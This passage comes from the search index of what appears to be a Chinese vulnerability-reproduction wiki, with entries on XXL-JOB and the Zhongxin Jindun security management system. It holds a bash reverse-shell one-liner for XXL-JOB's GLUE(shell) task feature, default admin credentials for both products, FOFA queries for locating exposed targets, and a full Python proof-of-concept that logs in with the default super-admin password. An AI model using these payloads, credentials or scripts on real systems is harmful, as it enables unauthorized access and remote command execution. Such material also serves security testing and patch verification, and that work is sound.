\u53ef\u6cc4\u9732\u7684\u4e3a\uff1a\u660e\u6587SMTP\u3001SVN\u548cGitlab\u7b49\u654f\u611f\u4fe1\u606f","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/SonarQube/SonarQube%20api%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-27986/#goby--poc","text":"[!NOTE] SonarQube api Information leakage","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"XXL-JOB \u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3 \u540e\u53f0\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 XXL-JOB \u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u540e\u53f0\u53ef\u4ee5\u901a\u8fc7\u5199\u5165shell\u547d\u4ee4\u4efb\u52a1\u8c03\u5ea6\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] XXL-JOB FOFA \u00b6 [!NOTE] app=\"XXL-JOB\" || title=\"\u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u540e\u53f0\u589e\u52a0\u4e00\u4e2a\u4efb\u52a1 [!NOTE] \u6ce8\u610f\u8fd0\u884c\u6a21\u5f0f\u9700\u8981\u4e3a GLUE(shell) \u70b9\u51fb GLUE IDE\u7f16\u8f91\u811a\u672c \u6267\u884c\u63a2\u6d4b\u51fa\u7f51\uff0c\u548c\u4efb\u52a1\u8c03\u7528\u662f\u5426\u53ef\u6267\u884c \u53cd\u5f39\u4e00\u4e2ashell #!/bin/bash bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1'","title":"XXL-JOB \u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3 \u540e\u53f0\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#xxl-job-\u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3-\u540e\u53f0\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":"","title":"XXL-JOB \u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3 \u540e\u53f0\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"XXL-JOB \u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u540e\u53f0\u53ef\u4ee5\u901a\u8fc7\u5199\u5165shell\u547d\u4ee4\u4efb\u52a1\u8c03\u5ea6\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] XXL-JOB","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] app=\"XXL-JOB\" || title=\"\u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u540e\u53f0\u589e\u52a0\u4e00\u4e2a\u4efb\u52a1 [!NOTE] \u6ce8\u610f\u8fd0\u884c\u6a21\u5f0f\u9700\u8981\u4e3a GLUE(shell) \u70b9\u51fb GLUE IDE\u7f16\u8f91\u811a\u672c \u6267\u884c\u63a2\u6d4b\u51fa\u7f51\uff0c\u548c\u4efb\u52a1\u8c03\u7528\u662f\u5426\u53ef\u6267\u884c \u53cd\u5f39\u4e00\u4e2ashell #!/bin/bash bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1'","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/","text":"XXL-JOB \u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3 \u540e\u53f0\u9ed8\u8ba4\u5f31\u53e3\u4ee4 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 XXL-JOB \u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3 \u540e\u53f0\u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u540e\u53f0\u8fdb\u4e00\u6b65\u653b\u51fb \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] XXL-JOB FOFA \u00b6 [!NOTE] app=\"XXL-JOB\" || title=\"\u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4f7f\u7528\u9ed8\u8ba4\u53e3\u4ee4\u767b\u5f55 admin 123456 Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d XXL_JOB_Default_password","title":"XXL-JOB \u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3 \u540e\u53f0\u9ed8\u8ba4\u5f31\u53e3\u4ee4"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#xxl-job-\u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3-\u540e\u53f0\u9ed8\u8ba4\u5f31\u53e3\u4ee4","text":"","title":"XXL-JOB \u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3 \u540e\u53f0\u9ed8\u8ba4\u5f31\u53e3\u4ee4"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u63cf\u8ff0","text":"XXL-JOB \u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3 \u540e\u53f0\u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u540e\u53f0\u8fdb\u4e00\u6b65\u653b\u51fb","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] XXL-JOB","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#fofa","text":"[!NOTE] app=\"XXL-JOB\" || title=\"\u4efb\u52a1\u8c03\u5ea6\u4e2d\u5fc3\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u590d\u73b0","text":"\u4f7f\u7528\u9ed8\u8ba4\u53e3\u4ee4\u767b\u5f55 admin 123456","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%90%8E%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d XXL_JOB_Default_password","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/","text":"\u4e2d\u65b0\u91d1\u76fe\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf \u9ed8\u8ba4\u8d85\u7ea7\u7ba1\u7406\u5458\u5bc6\u7801\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u4e2d\u65b0\u7f51\u7edc\u4fe1\u606f\u5b89\u5168\u80a1\u4efd\u6709\u9650\u516c\u53f8\u4e2d\u65b0\u91d1\u76fe\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4\uff0c\u767b\u5f55\u8eab\u4efd\u4e3a\u8d85\u7ea7\u7ba1\u7406\u5458 \u76ee\u524d\u5927\u90e8\u5206\u4f7f\u7528\u7684\u90fd\u53d7\u5230\u4e86\u5f71\u54cd \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u4e2d\u65b0\u91d1\u76fe\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf FOFA \u00b6 [!NOTE] title=\"\u4e2d\u65b0\u91d1\u76fe\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u770b\u5230\u4ea7\u54c1\u624b\u518c \u7cfb\u7edf\u9ed8\u8ba4\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801\uff1a admin/zxsoft1234!@#$ \u767b\u5f55\u9875\u9762\u5982\u4e0a\uff0c\u4f7f\u7528\u8d26\u53f7\u5bc6\u7801\u767b\u5f55 \u5176\u4e2d\u6cc4\u9732\u4e86\u5927\u90e8\u5206\u4fe1\u606f\uff0c\u5176\u4e2d\u5305\u62ec SMMS\u4e0eFTP \u53ca\u7528\u6237\u4fe1\u606f \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] \u8bf7\u6c42 ?q=common/getcode \u65f6 \u8fd4\u56de\u4e86\u9a8c\u8bc1\u7801\uff0c\u901a\u8fc7\u9a8c\u8bc1\u7801\u53ef\u7206\u7834\u8d26\u53f7\u5bc6\u7801\u7b49\u64cd\u4f5c import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u4e2d\u65b0\u91d1\u76fe\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf \u9ed8\u8ba4\u8d85\u7ea7\u7ba1\u7406\u5458\u5bc6\u7801\u6f0f\u6d1e \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"?q=common/getcode\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u83b7\u53d6\u9a8c\u8bc1\u7801 {} ?q=common/getcode ..... \\033 [0m\" . format ( target_url )) response_data = response . headers [ 'Set-Cookie' ] check_code = re . findall ( r 'check_code=(.*?);' , response_data )[ 0 ] PHPSESSID = re . findall ( r 'PHPSESSID=(.*?);' , response_data )[ 0 ] print ( \" \\033 [36m[o] \u9a8c\u8bc1\u7801: {} \\n [o] PHPSESSID: {} \\033 [0m\" . format ( check_code , PHPSESSID )) POC_2 ( target_url , check_code , PHPSESSID ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , check_code , PHPSESSID ): vuln_url = target_url + \"?q=common/login\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : \"PHPSESSID= {} ; check_code= {} \" . format ( PHPSESSID , check_code ), \"Content-Type\" : \"application/x-www-form-urlencoded; charset=UTF-8\" } data = \"name=admin&password=zxsoft1234! %40% 23%24&checkcode= {} &doLoginSubmit=1\" . format ( check_code ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if \"1\" in response . text and response . status_code == 200 : print ( \" \\033 [36m[o] \u76ee\u6807 {} \u5b58\u5728\u9ed8\u8ba4\u7ba1\u7406\u5458\u5f31\u53e3\u4ee4 admin / zxsoft1234!@#$ \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u9ed8\u8ba4\u7ba1\u7406\u5458\u5f31\u53e3\u4ee4 \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d ZhongXinJingDun_Default_administrator_password","title":"\u4e2d\u65b0\u91d1\u76fe\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf \u9ed8\u8ba4\u8d85\u7ea7\u7ba1\u7406\u5458\u5bc6\u7801\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/#\u4e2d\u65b0\u91d1\u76fe\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf-\u9ed8\u8ba4\u8d85\u7ea7\u7ba1\u7406\u5458\u5bc6\u7801\u6f0f\u6d1e","text":"","title":"\u4e2d\u65b0\u91d1\u76fe\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf \u9ed8\u8ba4\u8d85\u7ea7\u7ba1\u7406\u5458\u5bc6\u7801\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u4e2d\u65b0\u7f51\u7edc\u4fe1\u606f\u5b89\u5168\u80a1\u4efd\u6709\u9650\u516c\u53f8\u4e2d\u65b0\u91d1\u76fe\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4\uff0c\u767b\u5f55\u8eab\u4efd\u4e3a\u8d85\u7ea7\u7ba1\u7406\u5458 \u76ee\u524d\u5927\u90e8\u5206\u4f7f\u7528\u7684\u90fd\u53d7\u5230\u4e86\u5f71\u54cd","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u4e2d\u65b0\u91d1\u76fe\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"\u4e2d\u65b0\u91d1\u76fe\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u770b\u5230\u4ea7\u54c1\u624b\u518c \u7cfb\u7edf\u9ed8\u8ba4\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801\uff1a admin/zxsoft1234!@#$ \u767b\u5f55\u9875\u9762\u5982\u4e0a\uff0c\u4f7f\u7528\u8d26\u53f7\u5bc6\u7801\u767b\u5f55 \u5176\u4e2d\u6cc4\u9732\u4e86\u5927\u90e8\u5206\u4fe1\u606f\uff0c\u5176\u4e2d\u5305\u62ec SMMS\u4e0eFTP \u53ca\u7528\u6237\u4fe1\u606f","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] \u8bf7\u6c42 ?q=common/getcode \u65f6 \u8fd4\u56de\u4e86\u9a8c\u8bc1\u7801\uff0c\u901a\u8fc7\u9a8c\u8bc1\u7801\u53ef\u7206\u7834\u8d26\u53f7\u5bc6\u7801\u7b49\u64cd\u4f5c import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u4e2d\u65b0\u91d1\u76fe\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf \u9ed8\u8ba4\u8d85\u7ea7\u7ba1\u7406\u5458\u5bc6\u7801\u6f0f\u6d1e \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"?q=common/getcode\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u83b7\u53d6\u9a8c\u8bc1\u7801 {} ?q=common/getcode ..... \\033 [0m\" . format ( target_url )) response_data = response . headers [ 'Set-Cookie' ] check_code = re . findall ( r 'check_code=(.*?);' , response_data )[ 0 ] PHPSESSID = re . findall ( r 'PHPSESSID=(.*?);' , response_data )[ 0 ] print ( \" \\033 [36m[o] \u9a8c\u8bc1\u7801: {} \\n [o] PHPSESSID: {} \\033 [0m\" . format ( check_code , PHPSESSID )) POC_2 ( target_url , check_code , PHPSESSID ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , check_code , PHPSESSID ): vuln_url = target_url + \"?q=common/login\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : \"PHPSESSID= {} ; check_code= {} \" . format ( PHPSESSID , check_code ), \"Content-Type\" : \"application/x-www-form-urlencoded; charset=UTF-8\" } data = \"name=admin&password=zxsoft1234! %40% 23%24&checkcode= {} &doLoginSubmit=1\" . format ( check_code ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if \"1\" in response . text and response . status_code == 200 : print ( \" \\033 [36m[o] \u76ee\u6807 {} \u5b58\u5728\u9ed8\u8ba4\u7ba1\u7406\u5458\u5f31\u53e3\u4ee4 admin / zxsoft1234!@#$ \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u9ed8\u8ba4\u7ba1\u7406\u5458\u5f31\u53e3\u4ee4 \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d 